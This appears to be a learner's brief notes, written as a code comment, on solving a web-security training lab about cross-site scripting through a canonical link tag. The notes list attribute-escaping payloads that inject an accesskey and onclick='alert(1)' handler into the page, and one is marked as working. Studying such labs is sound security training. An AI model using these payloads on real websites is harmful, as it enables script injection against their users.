/* 
I tried manipulating the source using inspector in canonical link and got XSS alert but didnt solve the lab
accesskey="X" onclick="alert(1)"

the academy page mentions the HIDDEN inputs
concatenating a random string in the URL of the lab 
watching the source reveals that the string indeed gets added to the canonical URL 
in the href so we need to escape the href

/?'accesskey="x"onclick='alert(1)
/?'accesskey='x'onclick='alert(1)               this worked
